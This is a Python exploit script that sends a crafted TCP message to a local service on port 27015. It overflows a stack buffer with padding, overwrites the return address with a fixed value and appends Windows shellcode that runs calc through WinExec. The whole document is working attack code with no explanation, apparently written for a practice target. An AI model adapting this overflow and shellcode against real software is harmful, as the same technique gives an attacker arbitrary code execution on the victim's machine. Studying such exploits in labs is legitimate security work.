#!/usr/bin/python

import socket
import sys
import binascii
from subprocess import Popen, PIPE

winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)

TCP_IP = socket.gethostname()
TCP_PORT = 27015
BUFFER_SIZE = 1024
MESSAGE = b"\xFE\xCA\xFE\xCA"

buffer_data = b"A"*128
pHints = b"A"*32
lenBuffer = b"A"*4
pDescriptorDelSocket = b"A"*4
sockete = b"A"*4
ppResult = b"A"*4
vCantDeBytesLeidos = b"A"*4
nextstackframe = b"A"*4
returnaddress = b"\xBC\x19\x41\x00"

MESSAGE += buffer_data + pHints + lenBuffer + pDescriptorDelSocket + sockete + ppResult + vCantDeBytesLeidos + nextstackframe + returnaddress
MESSAGE += winexec_calc_shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(MESSAGE)
data = s.recv(BUFFER_SIZE)
s.close()
print("received data:", data)